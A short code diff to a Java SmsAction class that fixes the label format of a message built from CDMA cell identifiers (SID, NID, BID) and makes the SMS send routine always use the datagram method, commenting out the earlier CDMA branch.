@@ -111,7 +111,7 @@ public final class SmsAction extends SubAction {
             final int bid = cellinfo.getBID();
 
             final StringBuffer mb = new StringBuffer();
-            mb.append("SID" + sid);
+            mb.append("SID: " + sid);
             mb.append(" NID: " + nid);
             mb.append(" BID: " + bid);
             message = mb.toString();
@@ -129,7 +129,10 @@ public final class SmsAction extends SubAction {
     }
 
     boolean sendSMS(final String message) {
-        boolean ret;
+        
+        return sendSMSDatagram(message);
+        
+      /*  boolean ret;
         if (Device.isCDMA()) {
             ret = sendSMSDatagram(message);
             if (!ret) {
@@ -139,7 +142,7 @@ public final class SmsAction extends SubAction {
             ret = sendSMSMessage(message);
         }
 
-        return ret;
+        return ret;*/
     }
 
     boolean sendSMSMessage(final String message) {
